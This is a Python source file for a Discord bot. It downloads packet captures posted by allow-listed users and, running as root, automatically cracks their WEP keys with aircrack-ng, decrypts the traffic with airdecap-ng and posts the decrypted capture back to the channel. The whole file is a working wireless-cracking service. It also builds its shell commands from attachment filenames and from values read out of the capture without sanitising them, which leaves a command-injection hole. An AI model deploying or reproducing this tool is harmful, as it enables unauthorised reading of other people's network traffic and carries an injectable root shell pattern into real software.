#!/usr/bin/python
# coding:UTF-8

import json
import os
import platform
import shutil
import colorlog
import discord
import requests
from io import BytesIO  # Import BytesIO at the beginning of your script
from discord.ext import commands
from datetime import datetime


# Log class
class Log:
    def __init__(self, filename="Server.log"):
        """
        Initializes a new instance of the Log class.

        Args:
            filename (str, optional): The name of the log file. Defaults to "Server.log".

        Initializes the `filename` and `size` attributes of the Log instance.
        If the log file does not exist, it creates an empty file with the specified name.
        """
        # Use the provided filename or default to 'Server.log'
        self.filename = str(filename)

        # Check if the file exists and create it if it doesn't
        if not os.path.exists(self.filename):
            with open(self.filename, "w") as log_file:
                log_file.write(
                    "|-----Timestamp-----|--Log Level--|-----------------------------------------------------------------------Log Messages-----------------------------------------------------------------------|\n"
                )
                pass  # Empty file content is fine here since we append logs

    @staticmethod
    def __timestamp():
        """
        Retrieves the current date and time and formats it into a string timestamp.

        Returns:
            str: A string representing the formatted timestamp.
        """
        # Get the current date and time
        now = datetime.now()
        # Format the timestamp as a string
        time = f"{now.strftime('%Y-%m-%d %H:%M:%S')}"
        return time

    def info(self, message):
        """
        Writes an information log message to the log file.

        Args:
            message (str): The message to be logged.

        Returns:
            None
        """
        with open(self.filename, "a") as f:
            f.write(f"[{self.__timestamp()}] > INFO:       {message}\n")

    def warning(self, message):
        """
        Writes a warning log message to the log file.

        Args:
            message (str): The warning message to be logged.

        Returns:
            None
        """
        with open(self.filename, "a") as f:
            f.write(f"[{self.__timestamp()}] > WARNING:    {message}\n")

    def error(self, message):
        """
        Writes an error log message to the log file.

        Args:
            message (str): The error message to be logged.

        Returns:
            None
        """
        with open(self.filename, "a") as f:
            f.write(f"[{self.__timestamp()}] > ERROR:      {message}\n")

    def critical(self, message):
        """
        Writes a critical log message to the log file.

        Args:
            message (str): The critical message to be logged.

        Returns:
            None
        """
        with open(self.filename, "a") as f:
            f.write(f"[{self.__timestamp()}] > CRITICAL:   {message}\n")


# Configure colorlog for logging messages with colors
log = Log(filename="Discord.log")
logger = colorlog.getLogger()

handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s%(levelname)-8s%(reset)s %(blue)s%(message)s",
    datefmt=None,
    reset=True,
    log_colors={
        "DEBUG": "cyan",
        "INFO": "green",
        "WARNING": "yellow",
        "ERROR": "red",
        "CRITICAL": "red",
    },
)
handler.setFormatter(formatter)
logger.addHandler(handler)


# Function to read secret keys and information from JSON file
def read_key():
    """
    Attempts to read and parse the 'api.json' file to extract configuration settings.

    The function checks if the file exists, is in the correct format, and contains the required keys. It then returns a tuple containing the extracted configuration values.

    Returns:
        tuple: A tuple containing the extracted configuration values:
            - token (str): The token value from the 'api.json' file.
            - channel_id (int): The channel ID value from the 'api.json' file.
            - webhooks_username (str): The webhooks username value from the 'api.json' file.
            - limit_of_messages_to_check (int): The limit of messages to check value from the 'api.json' file.
            - log_using_debug? (bool): The log using debug value from the 'api.json' file.
    """
    try:
        with open("api.json", "r") as f:
            config = json.load(f)
        if (
            config is not None
            and isinstance(config["token"], str)
            and isinstance(config["channel_id_(for_pcaps)"], int)
            and isinstance(config["channel_id_(for_logs)"], int)
            and isinstance(config["webhooks_username"], list)
            and isinstance(config["log_using_debug?"], bool)
        ):
            return (
                config["token"],
                config["channel_id_(for_pcaps)"],
                config["channel_id_(for_logs)"],
                config["webhooks_username"],
                config["log_using_debug?"],
            )
        else:
            colorlog.critical("Invalid JSON file format")
            log.critical("Invalid JSON file format")
            exit(1)
    except Exception as e:
        colorlog.critical(f"Error reading JSON file: {e}")
        log.critical(f"Error reading JSON file: {e}")
        exit(1)


# All global variables, and required initializations are done here.
TOKEN, CHANNEL_ID_PCAPS, CHANNEL_ID_LOGS, WEBHOOK_USERNAME, DEBUG = read_key()
if DEBUG:
    logger.setLevel(colorlog.DEBUG)
else:
    logger.setLevel(colorlog.INFO)
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())


@bot.event
async def on_ready():
    """
    Event handler triggered when the bot is fully connected and ready.

    This function is called when the bot has finished connecting to Discord and
    is ready to start accepting commands and events.

    Parameters:
    None

    Returns:
    None
    """
    colorlog.info(f"We have logged in as {bot.user}")
    log.info(f"We have logged in as {bot.user}")


@bot.event
async def on_message(message):
    """
    Event handler triggered when a message is received, with checks of the author.

    Parameters:
        message (discord.Message): The message object containing information about the message.

    Returns:
        None
    """
    channel_pcaps = await message.guild.fetch_channel(CHANNEL_ID_PCAPS)
    channel_log = await message.guild.fetch_channel(CHANNEL_ID_LOGS)
    if isinstance(channel_pcaps, discord.TextChannel) and isinstance(
        channel_log, discord.TextChannel
    ):
        colorlog.info(f"Message from {message.author}: {message.content}")
        log.info(f"Message from {message.author}: {message.content}")
        if message.content == "/logs":
            if (
                message.author == message.guild.owner
                or message.author.guild_permissions.administrator
            ):
                if message.channel.id == CHANNEL_ID_LOGS:
                    await logs(message.channel)
                else:
                    await message.channel.send(
                        "This is not the logs preconfigured channel. Please use the /logs command in the logs channel."
                    )
                    colorlog.warning(
                        f"Channel {message.channel} is not the one preconfigured."
                    )
                    log.warning(
                        f"Channel {message.channel} is not the one preconfigured."
                    )
            else:
                await message.channel.send(
                    "You do not have permission to use this command?"
                )
                colorlog.error(
                    f"User {message.author} does not have permission to use this command."
                )
                log.error(
                    f"User {message.author} attempted to use the /logs command. Invalid permission's."
                )
        elif str(message.author) in WEBHOOK_USERNAME:
            colorlog.info("Extracting and decrypting pcaps...")
            await extract_and_decrypt(CHANNEL_ID_PCAPS)
        elif str(message.author) not in WEBHOOK_USERNAME and message.author != bot.user:
            colorlog.info(
                f"Message Ignored due to {message.author} not being in the allowed list of users: {WEBHOOK_USERNAME}"
            )
            log.info(
                f"Message Ignored due to {message.author} not being in the allowed list of users: {WEBHOOK_USERNAME}"
            )
    else:
        colorlog.critical(
            f"Channel {CHANNEL_ID_PCAPS} or {CHANNEL_ID_LOGS} not found as text channels."
        )
        log.critical(
            f"Channel {CHANNEL_ID_PCAPS} or {CHANNEL_ID_LOGS} not found as text channels. Bot Crashed."
        )
        exit(1)


async def logs(ctx):
    """
    Retrieves and sends the Discord logs to a specified channel.

    Parameters:
    ctx (discord.ext.commands.Context): The context of the command invocation.

    Returns:
    None
    """
    # Retrieve the channel object using the provided channel ID
    channel = bot.get_channel(CHANNEL_ID_LOGS)
    if channel is None:
        await ctx.send("Channel not found.")
        return

    try:
        # Instead of reading the file content into memory,
        # simply pass the filename to discord.File
        fileToSend = discord.File("Discord.log", filename="Discord.log")

        await channel.send(f"Here are the logs\n", file=fileToSend)
    except os.error as e:
        await ctx.send(f"Error uploading logs: {e}")
        colorlog.critical(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")
    except discord.errors.HTTPException as e:
        await ctx.send(f"Error uploading logs: {e}")
        colorlog.critical(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")
    except Exception as e:
        await ctx.send(f"Error uploading logs: {e}")
        colorlog.critical(f"Error uploading logs: {e}")
        log.critical(f"Error uploading logs: {e}")


async def extract_and_decrypt(channel_id):
    """
    Extracts and decrypts pcap files from a specified Discord channel.

    This function iterates over the messages in the specified channel, checks for attachments with a .pcap file extension,
    and attempts to download and decrypt them. It also handles reactions and error cases.

    Parameters:
        channel_id (int): The ID of the Discord channel to extract pcap files from.

    Returns:
        None

    This function performs the following steps:
    1. Retrieves the specified channel using the provided channel ID.
    2. Checks if the channel exists, and if not, logs an error and returns.
    3. Iterates over the messages in the channel, starting from the most recent.
    4. For each message, checks if the author is the specified webhook username.
    5. If the author is the specified webhook username, iterates over the attachments of the message.
    6. For each attachment, checks if the file extension is .pcap.
    7. If the file extension is .pcap, checks if the message has a reaction with the emoji '👍'.
    8. If the message has a reaction with the emoji '👍', skips the message and continues to the next one returning to step 3/4.
    9. Downloads the pcap file using the attachment URL and filename.
    10. Logs the download status and filename.
    11. Attempts to crack the pcap file using various tools and techniques.
    12. If cracking is successful, logs the cracked file status and filename.
    13. If cracking fails, logs the failure status and filename.
    14. Adds a reaction to the message based on the cracking result.
    15. Uploads and deletes the cracked file from the message channel.
    16. Handles various exceptions and error cases during the process.
    """
    channel = bot.get_channel(channel_id)
    if channel is None:
        colorlog.error(f"Channel with ID {channel_id} not found.")
        log.error(f"Channel with ID {channel_id} not found.")
        return

    async for message in channel.history(limit=20):
        file_count = 0
        for attachment in message.attachments:
            file_count += 1
            if attachment.filename.endswith(".pcap"):
                if any(reaction.emoji == "👍" for reaction in message.reactions):
                    colorlog.info(
                        f"Seen reaction found. Skipping download for file code: [{file_count}]."
                    )
                    log.info(
                        f"Seen reaction found. Skipping download for file code: [{file_count}]."
                    )
                else:
                    try:
                        await message.clear_reactions()
                        colorlog.info(
                            f"Cleared all reactions from message ID {message.id}"
                        )
                        log.info(
                            f"Cleared all reactions from message ID {message.id}"
                        )
                    except Exception as e:
                        colorlog.error(
                            f"Failed to clear reactions from message ID {message.id}: {e}"
                        )
                        log.error(
                            f"Failed to clear reactions from message ID {message.id}: {e}"
                        )
                    await message.add_reaction("👀")
                    name = attachment.filename
                    await download_pcap_file(attachment.url, name)
                    colorlog.info(f"Downloaded {name} from {attachment.url}")
                    log.info(f"Downloaded {name} from {attachment.url}")

                    try:
                        colorlog.info(f"Attempting to crack pcap files [{file_count}]...")
                        log.info(f"Attempting to crack pcap files [{file_count}]...")
                        try:
                            await message.add_reaction("👀")

                            if platform.system() != "Linux":
                                colorlog.error(
                                    f"Windows is not supported for cracking. Please use Linux."
                                )
                                log.error(
                                    f"Windows attempted to be used for cracking. Failed"
                                )
                                # Wrong OS
                                await message.add_reaction("⛔")
                            else:
                                try:

                                    def crack(filename):
                                        """
                                        Attempts to crack a pcap file using various tools and techniques.

                                        Parameters:
                                        filename (str): The name of the pcap file to crack.

                                        Returns:
                                        bool: True if the cracking process is successful, False otherwise.
                                        """
                                        try:
                                            if os.geteuid() != 0:
                                                colorlog.critical(
                                                    "Please run this python script as root..."
                                                )
                                                log.critical("Root Running Failed...")
                                                return False

                                            if os.path.exists(filename) == 0:
                                                colorlog.critical(
                                                    f"File {filename} was not found, did you spell it correctly?"
                                                )
                                                log.critical(
                                                    f"File {filename} was not found"
                                                )
                                                return False

                                            checklist = [
                                                "airmon-ng",
                                                "tshark",
                                                "editcap",
                                                "pcapfix",
                                            ]
                                            installed = True

                                            for check in checklist:
                                                cmd = "locate -i " + check + " > /dev/null"
                                                checked = os.system(cmd)
                                                if checked != 0:
                                                    colorlog.warning(
                                                        f"Could not find {check} in the system..."
                                                    )
                                                    log.warning(
                                                        f"Could not find {check} in the system..."
                                                    )
                                                    installed = False

                                            if not installed:
                                                colorlog.critical(
                                                    "Install those missing dependencies before you begin..."
                                                )
                                                return False

                                            new_filetype = filename[:-2]
                                            typetest = filename[-6:]

                                            colorlog.debug("Filename: " + filename)
                                            colorlog.debug("File Format: " + typetest)

                                            if typetest == "pcapng":
                                                colorlog.info(
                                                    "Crack Status: Converting file format..."
                                                )
                                                log.info("Converting pcapng file...")
                                                os.system(
                                                    "editcap -F pcap '"
                                                    + filename
                                                    + "' '"
                                                    + new_filetype
                                                    + "' > /dev/null"
                                                )
                                                filename = filename[:-2]
                                                colorlog.debug("New Filename: " + filename)

                                            os.system(
                                                "pcapfix -d '"
                                                + filename
                                                + "' -o Fixerror.pcap > /dev/null"
                                            )

                                            if os.path.isfile("./Fixerror.pcap") != 0:
                                                os.rename(filename, "Oldpcapfile.pcap")
                                                os.rename("Fixerror.pcap", filename)
                                                colorlog.info(
                                                    f"Crack Status: Fixing file errors for {filename}.."
                                                )
                                                log.info(
                                                    f"Fixing file errors for {filename}..."
                                                )
                                                colorlog.debug(
                                                    "Original Renamed: Oldpcapfile.pcap"
                                                )

                                            print("-" * 100)
                                            cmd = (
                                                "tcpdump -ennr '"
                                                + filename
                                                + "' '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt"
                                            )
                                            os.system(cmd)
                                            print("-" * 100)

                                            ssid = open("SSID.txt").readline().rstrip()
                                            os.remove("./SSID.txt")
                                            ssid = "00:" + ssid

                                            if ssid == "00:":
                                                colorlog.critical(
                                                    f"Empty SSID: The ssid {ssid} was given, This is not allowed..."
                                                )
                                                log.critical(
                                                    f"Empty SSID: The ssid [{ssid}] was found empty as '00:'."
                                                )
                                                return False
                                            else:
                                                colorlog.info(f"Service Set Id: {ssid}")
                                                log.info(f"Service Set Id Obtained")

                                            os.system(
                                                "aircrack-ng -b "
                                                + ssid
                                                + " '"
                                                + filename
                                                + "' > Answer.txt"
                                            )
                                            os.system(
                                                "awk '/KEY FOUND!/{print $(NF-1)}' Answer.txt > WepKey.txt"
                                            )
                                            os.remove("./Answer.txt")
                                            wep = open("WepKey.txt").readline().rstrip()
                                            os.remove("./WepKey.txt")
                                            colorlog.info("Wired Privacy Key : " + wep)
                                            log.info("Wired Privacy Key Obtained")

                                            os.system(
                                                "airdecap-ng -w "
                                                + wep
                                                + " '"
                                                + filename
                                                + "' "
                                                + "> /dev/null"
                                            )
                                            filename2 = filename[:-5]
                                            filename2 += "-dec.pcap"

                                            # Create the CRACKED directory if it doesn't exist
                                            if not os.path.exists("CRACKED"):
                                                os.makedirs("CRACKED")

                                            shutil.move(filename2, f"CRACKED/{filename2}")

                                            # Rename the file within the CRACKED directory to include the SSID
                                            new_filename = f"Cracked_{ssid}.pcap"
                                            try:
                                                os.rename(
                                                    f"CRACKED/{filename2}",
                                                    f"CRACKED/{new_filename}",
                                                )
                                                colorlog.info(
                                                    f"Renamed Cracked File: {new_filename}"
                                                )
                                            except FileExistsError:
                                                os.remove(f"CRACKED/{new_filename}")
                                                os.rename(
                                                    f"CRACKED/{filename2}",
                                                    f"CRACKED/{new_filename}",
                                                )
                                                colorlog.info(
                                                    f"Renamed Cracked File: {new_filename}"
                                                )
                                            log.info("Cracked File Renamed")
                                            return True
                                        except Exception as e:
                                            colorlog.error(e)
                                            log.error(str(e))
                                            return False

                                    crack_test = crack(name)
                                    if crack_test:
                                        colorlog.info(
                                            f"Crack Status: Successfully cracked {name}"
                                        )
                                        log.info(
                                            f"Crack Status: Successfully cracked {name}"
                                        )
                                        # Cracking succeeded
                                        await message.add_reaction("👍")
                                        await upload_and_delete_files(message)
                                    elif not crack_test:
                                        colorlog.error(
                                            f"Crack Status: Failed to crack {name}"
                                        )
                                        log.error(f"Crack Status: Failed to crack {name}")
                                        # Cracking has failed due to an error in the cracker function
                                        await message.add_reaction("👎")
                                    else:
                                        colorlog.critical("Non Boolean value returned")
                                        log.error("Non Boolean value returned")
                                        # Cracking failed due to value error returned from function
                                        await message.add_reaction("❔")

                                except Exception as e:
                                    colorlog.error(
                                        f"Failed to crack the pcap files...: {e}"
                                    )
                                    log.error(f"Failed to crack the pcap files...: {e}")
                                    # Cracking has failed due to an error from interpreter.
                                    await message.add_reaction("❌")
                        except discord.HTTPException as e:
                            colorlog.critical(f"A discord exception occurred: {e}")
                            log.critical(f"Discord exception occurred: {e}")
                            # Error Occurred, cracking was asked, Related to Discord HTTP exceptions.
                            await message.add_reaction("🚫")
                        except Exception as e:
                            colorlog.critical(f"Unexpected issue occurred: {e}")
                            log.critical(f"Unexpected issue occurred: {e}")
                            # Error Occurred, cracking was asked.
                            await message.add_reaction("⚠️")
                    except Exception as e:
                        colorlog.critical(f"Unexpected issue occurred: {e}")
                        log.critical(f"Unexpected issue occurred: {e}")
                        # Unknown Error Occurred, cracking was asked.
                        await message.add_reaction("⁉️")


async def upload_and_delete_files(message):
    """
    Uploads all files in the CRACKED directory as replies to the original message and then deletes them.

    Args:
        message (discord.Message): The original message that triggered the download.
    """
    # Ensure the CRACKED directory exists
    if not os.path.exists("CRACKED"):
        colorlog.warning("CRACKED directory does not exist?")
        log.warning("CRACKED directory does not exist?")
        return False

    # List all files in the CRACKED directory
    files_in_cracked = os.listdir("CRACKED")

    # Iterate over each file in the CRACKED directory
    for file_name in files_in_cracked:
        # Construct the full path to the file
        file_path = os.path.join("CRACKED", file_name)

        # Open the file in binary mode and read its content into a BytesIO object
        with open(file_path, "rb") as file:
            file_content = BytesIO(file.read())

            # Upload the BytesIO object as a file in a reply to the original message
            await message.channel.send(
                files=[discord.File(file_content, file_name)], reference=message
            )

            # Delete the file after uploading
            os.remove(file_path)

    # After uploading and deleting all files, remove the CRACKED directory itself
    shutil.rmtree("CRACKED")
    colorlog.info(
        "All files in the 'CRACKED' directory have been uploaded and deleted."
    )
    log.info("All files in the 'CRACKED' directory have been uploaded and deleted.")
    return True


async def download_pcap_file(url, filename):
    """
    Downloads a pcap file from the given URL and saves it to the specified filename.

    Args:
        url (str): The URL of the pcap file to download.
        filename (str): The filename to save the pcap file as.

    Returns:
        None
    """
    response = requests.get(url)
    with open(filename, "wb") as f:
        f.write(response.content)


bot.run(TOKEN, log_handler=None)
